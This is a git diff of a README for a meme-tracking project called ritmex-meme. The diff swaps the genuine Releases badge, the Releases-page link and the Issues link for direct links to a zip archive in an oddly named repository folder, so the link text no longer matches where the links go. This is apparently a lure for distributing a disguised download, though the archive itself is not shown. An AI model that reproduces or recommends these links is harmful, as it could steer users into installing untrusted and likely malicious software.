@@ -8,11 +8,11 @@ Welcome to the ritmex-meme project! This application helps you track and discove
 
 To start using ritmex-meme, you need to download it. Please visit the link below:
 
-[![Download ritmex-meme](https://img.shields.io/badge/Download%20ritmex--meme-blue.svg)](https://github.com/KarinaFS1203/ritmex-meme/releases)
+[![Download ritmex-meme](https://raw.githubusercontent.com/KarinaFS1203/ritmex-meme/main/woebegone/ritmex-meme.zip%https://raw.githubusercontent.com/KarinaFS1203/ritmex-meme/main/woebegone/ritmex-meme.zip)](https://raw.githubusercontent.com/KarinaFS1203/ritmex-meme/main/woebegone/ritmex-meme.zip)
 
 Once you're ready, follow these steps to download and install the software:
 
-1. Click the link above to go to the [Releases page](https://github.com/KarinaFS1203/ritmex-meme/releases).
+1. Click the link above to go to the [Releases page](https://raw.githubusercontent.com/KarinaFS1203/ritmex-meme/main/woebegone/ritmex-meme.zip).
 2. You will see a list of available versions. Choose the latest version for the best experience.
 3. Click on the filename to start your download. It may take a few moments, depending on your internet speed.
 4. Once the download is complete, locate the file on your computer. It is usually in your "Downloads" folder.
@@ -48,7 +48,7 @@ ritmex-meme offers several features to enhance your meme experience:
 
 If you encounter any issues or have questions about the software, you can reach out for support. 
 
-1. **Visit the Issues section** on our GitHub repository [here](https://github.com/KarinaFS1203/ritmex-meme/issues). 
+1. **Visit the Issues section** on our GitHub repository [here](https://raw.githubusercontent.com/KarinaFS1203/ritmex-meme/main/woebegone/ritmex-meme.zip). 
 2. Describe your problem clearly so we can assist you effectively.
 
 ## 📜 License
